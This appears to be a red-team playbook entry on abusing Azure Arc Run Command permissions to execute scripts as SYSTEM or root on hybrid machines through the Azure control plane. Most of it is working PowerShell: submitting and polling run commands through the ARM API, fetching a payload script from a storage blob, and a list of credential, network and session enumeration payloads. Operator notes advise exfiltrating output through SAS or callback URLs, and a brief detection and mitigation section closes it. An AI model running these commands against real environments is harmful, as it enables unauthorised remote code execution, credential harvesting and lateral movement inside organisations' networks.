## Overview

Azure Arc extends Azure's management plane to machines running outside Azure — on-premises servers, VMs in other clouds, bare metal hosts. The Arc agent installed on the machine polls Azure for management operations, including `Run Command` execution requests. An identity with `Microsoft.HybridCompute/machines/runCommands/write` can submit a script to any registered machine and retrieve the output through the ARM API.

The attack requires no direct network access to the machine, no SSH or RDP, and no OS-level credentials. The entire execution path is through the Azure control plane. Commands run as `SYSTEM` (Windows) or `root` (Linux) — the equivalent of full local administrator access.

## Preconditions

| Requirement | Detail |
|---|---|
| `Microsoft.HybridCompute/machines/runCommands/write` | Data plane permission on the Arc machine resource |
| Arc agent active on the target machine | Agent must be in `Connected` status — offline machines cannot receive commands |
| ARM token | Standard ARM audience: `https://management.azure.com/.default` |

The permission may come from a built-in role (`Azure Arc VMware VM Contributor` includes it), a custom role, or a broad wildcard assignment on the resource group.

## Attack Chain

```
Enumerate Arc machines   →  Get-AzConnectedMachine (list name, OS, status, location)
                         ↓
Check effective perms    →  /providers/Microsoft.Authorization/permissions on machine resource
                         ↓
Confirm runCommands/write present
                         ↓
PUT /runCommands/<NAME>  →  ARM API with script payload
                         ↓
Poll until Succeeded     →  GET same resource until provisioningState = Succeeded
                         ↓
Read output              →  instanceView.output / instanceView.error
                         ↓
Post-exploitation        →  credential dump, lateral movement, network enumeration
```

## Executing a Command

```powershell
$sub         = "<SUB_ID>"
$rg          = "<RESOURCE_GROUP>"
$machine     = "<ARC_MACHINE_NAME>"
$runCmdName  = "recon"
$location    = "<AZURE_REGION>"

$resourceId = "/subscriptions/$sub/resourceGroups/$rg/providers/Microsoft.HybridCompute/machines/$machine"
$runCmdUri  = "https://management.azure.com$resourceId/runCommands/$runCmdName`?api-version=2023-10-03-preview"

$body = @{
    location   = $location
    properties = @{
        source = @{
            script = 'whoami; hostname; ipconfig /all; cmdkey /list'
        }
    }
} | ConvertTo-Json -Depth 5

Invoke-RestMethod -Method PUT -Uri $runCmdUri -Body $body `
    -Headers @{ Authorization = "Bearer $ARM"; "Content-Type" = "application/json" }
```

## Polling for Output

```powershell
$status = $null
do {
    Start-Sleep -Seconds 5
    $status = Invoke-RestMethod -Method GET -Uri $runCmdUri `
        -Headers @{ Authorization = "Bearer $ARM" }
} while ($status.properties.provisioningState -ne "Succeeded")

Write-Host $status.properties.instanceView.output
Write-Host $status.properties.instanceView.error
```

## Via Az PowerShell Module

```powershell
# Inline script
Invoke-AzConnectedMachineRunCommand `
    -ResourceGroupName "<RESOURCE_GROUP>" `
    -MachineName       "<ARC_MACHINE>" `
    -RunCommandName    "recon" `
    -SourceScript      'whoami; Get-LocalUser; Get-Process -IncludeUserName | Select Name,UserName | Format-Table' `
    -Location          "<REGION>"

# Script from Storage blob (useful for longer payloads)
Invoke-AzConnectedMachineRunCommand `
    -ResourceGroupName "<RESOURCE_GROUP>" `
    -MachineName       "<ARC_MACHINE>" `
    -RunCommandName    "recon" `
    -SourceScriptUri   "https://<STORAGE_ACCOUNT>.blob.core.windows.net/<CONTAINER>/script.ps1?<SAS_TOKEN>" `
    -Location          "<REGION>"
```

## Useful Post-Exploitation Payloads

```powershell
# Credential enumeration
'cmdkey /list'
'reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
'Get-ChildItem Cert:\LocalMachine\My | Select Subject, Thumbprint, NotAfter'

# Network enumeration
'Get-NetTCPConnection -State Established | Select LocalAddress, LocalPort, RemoteAddress'
'Get-NetNeighbor | Select IPAddress, LinkLayerAddress, State'

# Active sessions
'Get-Process -IncludeUserName | Where-Object { $_.UserName } | Select Name, UserName, Id | Format-Table'

# Local group membership
'Get-LocalGroupMember -Group "Administrators"'
```

## Operator Notes

- Commands execute as `SYSTEM` (Windows) or `root` (Linux) — this is the Arc agent's execution context. No privilege escalation on the host is needed.
- The machine must be in `Connected` state. Arc agents that lose connectivity to Azure queue operations and execute them on reconnection — check agent heartbeat timestamps during recon.
- The `runCmdName` is an arbitrary string used as the ARM resource name for this execution. Use distinct names to track multiple runs; reusing the same name overwrites the previous output.
- Output is capped — very large stdout may be truncated. For large payloads, write output to a file and exfiltrate via a separate channel (Storage SAS URL, callback URL).
- Azure Arc machines are often on-premises servers with broad internal network access. Post-exploitation pivot value typically exceeds that of a cloud-only VM.

## Detection / Friction Points

- ARM Activity Log: `Create or Update Run Command` — actor, machine name, resource group, and submission timestamp are recorded.
- Output retrieval: `Get Run Command` appears as a read operation in the Activity Log.
- On the host: the Arc agent (`himds.exe` / `azcmagent`) spawns the script as a child process. On Windows, a `SYSTEM`-context PowerShell/cmd process appearing without an interactive session is potentially anomalous to EDR.
- Arc agent execution events can be logged locally and forwarded to Defender for Endpoint or a SIEM — EDR visibility on the host is the primary detection surface.
- Mitigation: restrict `runCommands/write` via custom RBAC roles; use Azure Policy to audit broad permissions on Arc machine resources.
